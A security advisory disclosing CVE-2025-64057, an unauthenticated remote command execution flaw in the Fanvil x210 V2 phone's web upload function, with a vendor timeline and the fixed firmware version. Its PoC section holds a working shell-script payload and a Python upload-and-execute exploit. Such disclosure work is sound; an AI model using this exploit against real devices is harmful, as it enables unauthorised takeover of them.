# Unauthenticated Remote Command Execution in Fanvil x210 V2 (CVE-2025-64057)
## Summary
We identified an authentication bypass that permits unauthenticated attackers on the local network to execute arbitrary system commands. This vulnerability enables attackers to gain complete control over the affected device.

## Affected products
- Fanvil x210 V2, firmware V2.12.20

## Details
During an analysis of the latest Fanvil X210 firmware (`X210-V2-2.12.20`, dated **2024-07-30**), a critical security issue was identified. The deviceâ€™s web application, used for configuration, allows an **unauthenticated attacker on the local network** to execute remote commands.

By analyzing the upload function's code, it was discovered that after a file is uploaded, **execution permissions are granted to all users** before being moved to its final destination. Additionally, file extension checking is not done on the back-end.

These flaws allow an attacker to upload a file containing shell commands and force the system to execute it.

For instance, an attacker could place the file in the `/webroot/cgi-bin` directory and exploit an authentication bypass to have the CGI processor execute it.

## PoC
test.sh
```sh
#!/bin/sh
echo "Content-type: text/html"
echo ""
echo "<html><body><pre>\n\n$(id)\n\n</pre></body></html>"
```

rce.py
```python
#!/usr/bin/python3
import requests
from time import sleep

IP="192.168.122.246"
PORT="8080"
UPLOAD_URL=f"http://{IP}:{PORT}/cgi-bin/webconfig?page=upload&action=submit"
EXECUTE_URL=f"http://{IP}:{PORT}/cgi-bin/test.sh"
SCRIPT_FILE="./test.sh"

with open(SCRIPT_FILE, 'rb') as f:
	multipart_form_data = {
		'upload/newfile': ('test.sh', f, 'application/octet-stream'),
		'upload/dest': (None, '/webroot/cgi-bin')
	}
	headers = {'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0'}

	response = requests.post(UPLOAD_URL, files=multipart_form_data, headers=headers)
	response = requests.get(EXECUTE_URL)
	print(response.text.strip())
```

## Impact
By exploiting this vulnerability, attackers could execute arbitrary system commands, gaining complete control over the affected device.

## Additional information
Issue fixed on firmware version 2.12.22.2

## Credits
Spike Reply Cybersecurity Team

## Disclosure timeline
- 01/03/2025: Vulnerability discovered
- 04/03/2025: Initial contact with vendor
- 06/03/2025: Technical details shared with vendor
- 25/04/2025: Disclosure date agreed with vendor (June 6, 2025)
- 14/05/2025: Vendor reports inability to reproduce this and other reported issues
- 06/06/2025: Team informs vendor they are retesting on firmware v2.12.22.2, released after initial contact (April 28, 2025)
- 09/06/2025: Vendor investigates whether web server changes in new firmware address the issues
- 25/06/2025: Team requests update - no response
- 07/07/2025: Follow-up request sent - still no response
- 16/07/2025: Team sends another follow-up and sets new disclosure date (July 28, 2025) - no response
- 25/11/2025: Disclosure
